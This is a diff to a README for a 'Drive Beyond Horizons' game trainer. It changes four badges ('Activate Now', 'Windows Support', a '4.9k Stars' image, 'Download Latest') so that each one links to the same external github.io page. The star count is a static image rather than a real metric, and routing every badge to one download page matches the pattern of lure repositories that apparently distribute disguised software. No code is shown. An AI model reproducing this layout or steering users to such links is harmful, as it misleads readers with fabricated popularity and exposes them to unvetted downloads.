@@ -2,10 +2,10 @@
 
 The **Drive Beyond Horizons Trainer Software** gives players full control over their driving experience. With real-time overlays, hotkey toggles, and customizable configs, you can adjust performance, unlock boosts, and test vehicle setups instantly.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.9k Stars](https://img.shields.io/badge/⭐️%204.9k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://drive-beyond-horizons-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://drive-beyond-horizons-trainer.github.io/.github/)
+[![⭐️ 4.9k Stars](https://img.shields.io/badge/⭐️%204.9k-Stars-yellow?style=for-the-badge\&logo=github)](https://drive-beyond-horizons-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://drive-beyond-horizons-trainer.github.io/.github/)
 
 ---
 
